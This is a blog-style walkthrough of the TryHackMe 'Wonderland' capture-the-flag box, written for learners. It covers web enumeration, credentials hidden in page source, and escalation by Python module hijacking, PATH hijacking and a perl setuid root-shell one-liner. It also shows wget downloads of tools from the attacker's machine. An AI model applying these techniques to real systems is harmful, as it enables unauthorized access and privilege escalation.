---
title: Wonderland Writeup
published: true
---
# TryHackMe - Wonderland
________________________

This is a medium difficulty box that's part of the [Offensive Security Path](https://tryhackme.com/path/outline/OSCP) on TryHackMe. For those of you who don't know, TryHackMe is a great website that not only has great CTFs, but tutorials on different offensive security techniques. To start out this box I've already made a `wonderland` directory to hold all my files relevent to the box. Within that directory I like to make another `nmap` directory to hold all my scans (usually one initial one is good enough for these kinds of CTFs, but other times a more in-depth one is needed).
<br>
<br>
<br>

## nmap Scan

The IP address of the box is `10.10.36.173`. We'll start things off with a typical nmap scan:

`nmap -sC -sV -oN nmap/wonderland_nmap_initial.txt 10.10.36.173`
<br>
<br>

![](/assets/images/wonderland/wonderland_nmap.png)  
<br>
<br>

We have two ports open, http on port 80 and ssh on port 22. Considering we don't have any login info for ssh, let's take a look at port 80.
<br>
<br>

## Website Enumeration

### Basic Discovery

Here's the home page of the website, it doesn't look like a whole lot is going on.
<br>
<br>

![](/assets/images/wonderland/wonderland_port80.png)
<br>
<br>

Let's take a look at the source code.

```
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)</p>
    <img src="/img/white_rabbit_1.jpg" style="height: 50rem;">
</body>
```  
<br>
<br>

The title of the page ***Follow the white rabbit.*** sounds interesting to me. But let's get some more info by running gobuster.

### Gobuster

Gobuster is a directory brute forcing tool (among other things). Basically it goes out and tries to find other directories that we can (or can't access). I like gobuster because it's fast, can search both directories and different file extenstions, and is used on the command line. Here's the gobuster command I'm running:

`gobuster dir -u http://10.10.36.173/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o wonderland_gobuster_root.txt
`

The -o argument allows me to save the output of the gobuster run in a txt file I can reference later.
<br>
<br>

![](/assets/images/wonderland/wonderland_gobuster_root.png)
<br>
<br>

The first thing that jumps out at me here is the `r` directory. Based on the fact that gobuster found an `r` directory as well as the ***Follow the white rabbit*** hint, I'm thinking we should go there. All the other stuff down there looks messy. If I need to, I can go back to it. Just for fun, I'm going to check out the `poem` directory.
<br>
<br>

{:refdef: style="text-align: center;"}
![](/assets/images/wonderland/wonderland_jabberwocky.png)
{: refdef}
<br>
<br>

Great poem, but not super useful to us. There wasn't much looking at the source code either.
<br>
<br>

### Directory Traversal

Ok, now let's follow the white rabbit. Going to the `r` directory leads us to this screen:
<br>
<br>

![](/assets/images/wonderland/wonderland_r.png)
<br>
<br>


Yeah, we're on the right track. I'm going to take a shot in the dark here that the directories will spell out `r/a/b/b/i/t`. We could take the time to run `gobuster` and confirm it, but why do that when it's easier to just guess.
<br>
<br>

![](/assets/images/wonderland/wonderland_rabbit.png)
<br>
<br>

Time to take a look at the source code again.

```
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:PASSWORD</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>

```
<br>

Looks like we've got some text that isn't displayed to the webpage, but is present in the source as the \<p\> tag with a hidden style attribute. Those look like credentials. Let's go back and try to login via SSH with these credentials.
<br>
<br>

## Foothold

Trying out the credentials found on the website give us initial access into the system.
<br>
<br>
![](/assets/images/wonderland/wonderland_initial_access.png)
<br>
<br>

## User Flag

Hmm, this is interesting...most of the time this is where the user.txt is.
<br>
<br>

![](/assets/images/wonderland/wonderland_alice.png)
<br>
<br>

After taking a look at the hints on THM, it says "Everything is upside down here.". So if the root.txt is here, does that mean that the user.txt is in the root directory? Let's take a look:
<br>
<br>

![](/assets/images/wonderland/wonderland_user.png)
<br>
<br>

Yes! That's the user flag down. now to do some system enumeration.
<br>
<br>

## User Enumeration

So far, this machine has been really straightforward. There was some directory traversal, some inspecting source code that contained some creds, then taking those creds and trying them in ssh. It's a safe bet that this will be a tad bit difficult. Looking around in the file system we see three other users `hatter`, `rabbit`, and `tryhackme`. We'll probably have at least one or two priv escs before root. I'm also seeing a python file in our home directory called `walrus_and_the_carpenter.py`. After running the command `sudo -l` and typing in Alice's password, we find out that we can run that program as the `rabbit` user. If we take a quick look at the program with `cat walrus_and_the_carpenter.py` we can see that there is a module imported, the random module. The program appears to take 10 random lines of a poem and print them to the screen.
<br>
<br>

![](/assets/images/wonderland/wonderland_sudo-l.png)
<br>
<br>

## Privilege Escalation

Believe it or not, we have all the information we need to shift to the `rabbit` user. We can do some python path manipulation in order to do it. I saw the same type of priv esc on box over at [Hack The Box](https://www.hackthebox.eu/). so I had a good idea of what to do here. We can create our own random.py module in a working directory, which the python script will import before the real one (located in the `/usr/lib/python3.6/random.py`). Here's the code we need to save as `random.py` to call on a bash shell as the rabbit user:

```
import os

os.system('/bin/bash')
```

Then we need to change the permissions of the program with `chmod +x random.py`. Then we can run `walrus_and_the_carpenter.py` as rabbit with `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`.
<br>
<br>

![](/assets/images/wonderland/wonderland_user_rabbit.png)
<br>
<br>

## More User Enumeration
Taking a quick look around, there's an executable binary called `teaParty`. Unfortunately we cannot see what sudo priveleges we have since we don't know the rabbit's password.
<br>
<br>

![](/assets/images/wonderland/wonderland_rabbit_enum.png)
<br>
<br>

I think its a safe bet to say that there's something to the `teaParty` file. In order to get a better idea of what it does, let's run it.

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 16 Jul 2020 22:41:34 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

It appears that there might be a `date` function being called. In order to get a better look, I'm going to use a program called `pspy` which you can read about and download [here](https://github.com/DominicBreuker/pspy). `Pspy` is a way to monitor linux processes, and give us a better idea of what functions the executable is calling on, and with what id#. I think the easiest way to use `pspy` in this situation is to just run two ssh sessions and monitor one with `pspy`while we run `teaParty` on the other. The first step is to spin up a web server on your attacking machine in the directory that holds `pspy` with `python3 -m http.server`. Once that's done, you can download it onto the victim machine with `wget http://<your-ip-address-here>:<port #>/pspy64`. Here are the results from `pspy`:
<br>
<br>

![](/assets/images/wonderland/wonderland_rabbit_esc.png)
<br>
<br>

## More Privilege Escalation

The interesting thing about these results is that the path for the command `date` has been left ambiguous. Because of this, we can do simple `PATH` manipulation and become the user with the id `1003`, which is the `hatter` according `/etc/passwd`. Typing in `$PATH` will give us the path that the system will look for different commands. We can add onto the beginning of the `PATH` variable our home directory in order to ensure that the `date` command that gets run give us a shell as the `hatter`. We do this by running `export PATH=/home/rabbit:$PATH`. Once the variable has been set we can run the following:
<br>
<br>

![](/assets/images/wonderland/wonderland_hatter.png)
<br>
<br>
Now we have a shell as the `hatter` :).

## Even More User Enumeration...

The hatter has a file in his home directory called `password.txt`. After trying this password to switch to the `root` user and failing, it turns out it's the hatter's password. Ok, well at least now we can run `sudo -l` and get an idea of how we can get root!
<br>
<br>

![](/assets/images/wonderland/wonderland_hatter_priv.png)
<br>
<br>

oh...
<br>
<br>

After floundering about for a bit, I decided to upload `linpeas.sh`, which is a shell script that will enumerate a system in a bright color scheme so you can scan through the results quick. You can read more about it and download [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Just like before we need to first spin up a web server with `python3 -m http.server` in the directory with the script in it. Then we get on the wonderland box and grab the file with `wget http://<your-ip-address-here>:<port #>/linpeas.sh`.
Once the file is on wonderland, change the permission with `chmod +x linpeas.sh`, then run the script with `./linpeas.sh`.
<br>
<br>

![](/assets/images/wonderland/wonderland_linpeas.png)
<br>
<br>

## Even More Privilege Escalation
Parsing through the linpeas looking for any interesting red text, we find:
<br>
<br>

![](/assets/images/wonderland/wonderland_hatter_priv_esc.png)
<br>
<br>

The `linpeas` script showed us that perl has the `CAP_SETUID` capability. Using [GTFOBins](https://gtfobins.github.io) to search for perl we get a great result under capabilities.
<br>
<br>

![](/assets/images/wonderland/wonderland_gtfo.png)
<br>
<br>

We should be able to simply run the command `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` and get root.
<br>
<br>

![](/assets/images/wonderland/wonderland_root.png)
<br>
<br>

## Final Thoughts

That's it! We got root on this box. This was the perfect level of difficulty for me at this time so I had a lot of fun on this one. I got to the box pretty quick, but the priv esc took some time. If it wasn't for my earlier exposure to python path manipulation I would've struggled with that. There were also plenty of places where you could've gone down a rabbit hole (pun intended). There were some crazy web directories, and I wouldn't have blamed someone if they thought there was some stego in one of the pictures on the website. All in all a great room. I loved the theme, the priv esc, and the fact that the user and root flags were switched was a nice touch. Thanks if you've read this far, I hope it helped you out some!
<br>
<br>
